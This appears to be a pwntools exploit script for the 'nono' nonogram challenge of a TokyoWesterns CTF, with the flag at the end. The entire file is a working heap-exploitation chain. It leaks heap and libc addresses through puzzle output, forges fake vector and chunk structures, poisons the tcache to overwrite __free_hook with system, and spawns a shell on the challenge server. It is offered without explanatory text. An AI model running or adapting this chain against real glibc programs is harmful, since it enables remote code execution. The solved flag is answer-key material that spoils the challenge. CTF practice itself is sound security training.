from pwn import *

import math


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


binpath = './nono-9e258bb04e49292a0467927f5ea9963fbc230abc2fdbbfabf629f69df4b614b1'
elf = ELF(binpath)
libc = elf.libc
# libc = ELF('./libc-59e53203baf0667facd95946d27239694359e09e0cd71aa11355918cdfd7b2ae.so.6')


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = '''
gef
b add_puzzle
b delete_puzzle
b play_puzzle
b show_puzzle
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('pwn03.chal.ctf.westerns.tokyo', 22915)


def malloc_size_to_len(size):
    return int(math.sqrt((size + 1) * 8 ))


def len_to_malloc_size(len_):
    return (len_ * len_) // 8  - 1


@debug
def play(index):
    io.sendlineafter(b'Your input: ', b'1')
    io.sendlineafter(b'Index:\n', b'%d' % index)
    io.recvuntil(b'!\n')


@debug
def leak_constraints(index):
    io.sendlineafter(b'Your input: ', b'1')
    io.sendlineafter(b'Index:\n', b'%d' % index)
    io.recvuntil(b'!\n')
    io.recvuntil(b"Row's Numbers\n")

    data = io.recvuntil(b'Col')
    row_constraints = []
    for l in data.split(b'\n')[:-1]:
        row_constraints.append(list(map(int, l.split(b','))))
    io.recvuntil(b'Numbers\n')

    data = io.recvuntil(b'Curr')
    col_constraints = []
    for l in data.split(b'\n')[:-1]:
        col_constraints.append(list(map(int, l.split(b','))))
    io.recvuntil(b': ')
    io.sendline(b'-1 -1')
    io.recvuntil(b'input error\n')
    return row_constraints, col_constraints


@debug
def add(title, size, puzzle):
    io.sendlineafter(b'Your input: ', b'2')
    io.sendlineafter(b'Title: ', title)
    io.sendlineafter(b'Size: ', b'%d' % size)
    io.sendafter(b'Puzzle: ', puzzle)
    time.sleep(0.1)
    io.recvuntil(b'Success')


@debug
def delete(index):
    io.sendlineafter(b'Your input: ', b'3')
    io.sendlineafter(b'Index:\n', b'%d' % index)
    io.recvuntil(b'Success')


@debug
def delete_title(title):
    io.sendlineafter(b'Your input: ', b'3')
    data = io.recvuntil(b'Index:\n')
    for l in data.split(b'\n'):
        assert (b':' in l)
        i, name = l.split(b':')
        name = name.split()[0]
        index = int(i)
        if title == name:
            del_index = index
            break
    io.sendline(b'%d' % del_index)
    io.recvuntil(b'Success')


@debug
def show_titles():
    io.sendlineafter(b'Your input: ', b'4')
    data = io.recvuntil(b'Index:\n')
    titles = []
    for l in data.split(b'\n')[:-2]:
        index, title = l.split(b':')
        title = title.split(b' ')[1]
        titles.append(title)
    io.sendline(b'-1')
    io.recvuntil(b'invalid choice\n')
    return titles

delete_title(b'Cross')
delete_title(b'Heart')

add(b'leak', 91, b'\x00')

row_constraints, _ = leak_constraints(0)
addr_leak = 0
for i, con in enumerate(row_constraints[2:2 + 8 * 8]):
    bit = con[0]
    addr_leak |= (bit << i)
addr_heap = addr_leak - 0x11f90
print('addr_heap: 0x{:08x}'.format(addr_heap))

addr_addr_main_arena = addr_heap + 0x11fb0
addr_fake_chunk = addr_heap + 0x11ff0

addr_fake_tab = addr_heap + 0x123d0
addr_fake_puzzle = addr_fake_tab + 0x8 * 0x8
addr_fake_overlapping_puzzle = addr_fake_puzzle + 0x60  # add sizeof(Puzzle)

print("addr_fake_tab = 0x{:08x}".format(addr_fake_tab))
print("addr_fake_puzzle = 0x{:08x}".format(addr_fake_puzzle))

fake_tab = b''
fake_tab += p64(addr_fake_puzzle)
fake_tab += p64(addr_fake_overlapping_puzzle)
num_entries =  len(fake_tab) // 8
fake_tab += p64(0) * (8 - num_entries)

fake_puzzle = b''
fake_puzzle += p64(0x1)  # size
fake_puzzle += p64(0xdeadbeef)  # puzzle_p
fake_puzzle += p64(addr_addr_main_arena)  # title: point to address of addr_main_arena
fake_puzzle += p64(8)  # size of `string title`
fake_puzzle += b'\x00' * (0x30 - len(fake_puzzle))
fake_puzzle += p64(0x0)  # solved

fake_hdr = b''
fake_hdr += p64(0xcafebabe) * 2
fake_hdr += p64(0)  # prev_size
fake_hdr += p64(0x41)  # size
fake_overlapping_puzzle = b''
fake_overlapping_puzzle += p64(0x41)  # size of chunk
fake_overlapping_puzzle += p64(0x2)  # size of puzzle
fake_overlapping_puzzle += p64(addr_fake_chunk + 0x10)  # puzzle_p
fake_overlapping_puzzle += p64(addr_fake_overlapping_puzzle + 0x20)  # point to str below
fake_overlapping_puzzle += p64(5)
fake_overlapping_puzzle += b'name\x00'  # small string optimization
fake_overlapping_puzzle += b'\x00' * (0x30 - len(fake_puzzle))
fake_overlapping_puzzle += p64(0x0)

payload = fake_tab + fake_puzzle + fake_hdr + fake_overlapping_puzzle
add(b'prevent', 80, payload)

delete_title(b'leak')

# Overwrite vec_puzzle
fake_vec = b''
fake_vec += p64(addr_fake_tab)  # start
fake_vec += p64(addr_fake_tab + (0x8 * num_entries))  # finish
fake_vec += p64(addr_fake_tab + 0x8 * 0x7)  # end_of_storage
payload = b'A' * 0x400 + fake_vec
add(b'bof', 100, payload)


titles = show_titles()
addr_libc = u64(titles[0].ljust(8, b'\x00')) - 0x1ebfd0
print('addr_libc = 0x{:08x}'.format(addr_libc))

payload = b''
payload += p64(0x0)  # prev_size
payload += p64(0xd1)  # size
add(b'overlapper', malloc_size_to_len(0x70), payload)  # contains fake chunk
payload = b''
add(b'overlapee', malloc_size_to_len(0x70), b'B')
add(b'inccnt', malloc_size_to_len(0x70), b'/bin/sh\x00')
delete_title(b'inccnt')
delete_title(b'overlapee')

delete(1)

payload = b''
payload += b'D' * 0x68
payload += p64(0x41)
payload += p64(addr_heap + 0x12130)  # don't break tcache
payload += b'E' * (0xa8 - len(payload))
payload += p64(0x81)  # size
payload += p64(addr_libc + libc.symbols['__free_hook'])
add(b'overwrite', malloc_size_to_len(0xc0), payload)

add(b'/' * 0x0f + b'bin/sh', malloc_size_to_len(0x70), b'/bin/sh\x00')
add(b'ovh', malloc_size_to_len(0x70), p64(addr_libc + libc.symbols['system']))

# delete_title(b'inccnt')

io.sendline(b'3')


io.interactive()


# TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}
